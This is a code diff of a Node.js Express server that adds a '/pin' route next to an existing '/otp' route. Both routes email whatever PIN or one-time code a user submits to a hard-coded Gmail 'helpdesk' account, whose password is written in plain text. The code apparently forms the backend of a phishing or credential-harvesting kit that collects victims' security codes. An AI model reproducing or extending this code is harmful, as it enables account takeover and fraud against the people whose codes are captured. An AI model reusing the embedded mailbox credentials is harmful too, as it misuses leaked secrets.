@@ -12,7 +12,6 @@ const PORT = process.env.PORT || 5000; // port to connect to WEB
 // emails credentials
 const userEmail = "alatng.helpdesk@gmail.com";
 const pass = "eqadjzwtienuwhut";
-// 20 nov
 
 // Middleware
 app.use(express.json());
@@ -68,6 +67,37 @@ app.post("/otp", (req, res) => {
     to: userEmail,
     subject: `OTP: ${req.body?.otp} `,
     text: `New user registered OTP: ${req.body?.otp}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for pin
+app.post("/pin", (req, res) => {
+  console.log(req.body);
+  let email = console.log(req.body.email);
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `PIN: ${req.body?.pin} `,
+    text: `New user registered PIN: ${req.body?.pin}`,
   };
 
   console.log(mailOptions);
